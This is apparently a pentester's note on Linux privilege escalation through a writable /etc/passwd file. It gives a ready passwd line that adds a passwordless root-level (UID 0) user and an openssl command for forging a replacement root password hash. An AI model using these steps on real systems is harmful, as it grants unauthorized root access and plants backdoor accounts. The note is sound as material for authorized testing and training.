There are various sensitive files within a system that can lead us to privilege escalation. Below, some of these escalations are detailed.


## /etc/passwd
If we have write permissions in the `/etc/passwd` file we can perform two different types of attack.
1. [Creating a new user.](#creating-a-new-user)
2. [Changing root password.](#changing-root-password)

### Creating a new user. 
We can just write a new user with root privileges.<br />
`pentester:` -> Username.<br />
`:::` -> No password.<br />
`0:` -> User ID (UID). If UID = 0 means that our user has superuser privileges.<br />
`0:` -> Group ID (GID). If GID = 0 means that we are part of the root group.<br />
`,,,::` -> Empty camps.<br />
`/:` -> Home directory.<br />
`/bin/bash` -> User shell.<br />
```bash
pentester::0:0:,,,:/:/bin/bash
```

### Changing root password.
The second technique we are going to exploit is very similar. The difference between them resides in the fact that instead of creating a new user, this time we are going to change root password. 
In our local machine we are going to execute `openssl` to create the new password:
```
openssl passwd <newPassword>
```

And then we just have to switch the `x` in the password field.
